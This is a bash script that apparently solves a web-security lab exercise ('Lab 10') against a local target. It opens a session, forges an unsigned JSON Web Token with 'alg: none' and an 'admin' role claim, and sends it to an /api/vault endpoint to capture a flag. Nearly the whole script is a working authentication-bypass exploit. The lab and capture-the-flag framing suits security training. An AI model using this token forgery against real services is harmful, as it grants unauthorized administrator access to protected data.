#!/usr/bin/env bash
# Lab 10 — `alg: none` is accepted, so the signature is optional.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9100}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab10

"$H5I" browser open "$URL/api/token" --session "$SESSION" --new --capture >/dev/null

FORGED="$(python3 -c '
import base64, json
b64 = lambda raw: base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
part = lambda obj: b64(json.dumps(obj, separators=(",", ":")).encode())
print(part({"alg": "none", "typ": "JWT"}) + "." +
      part({"sub": "guest", "role": "admin", "iss": "passport"}) + ".")')"

send "$SESSION" req_0 --create --set path=/api/vault \
    --set "header.Authorization=Bearer $FORGED" | flag
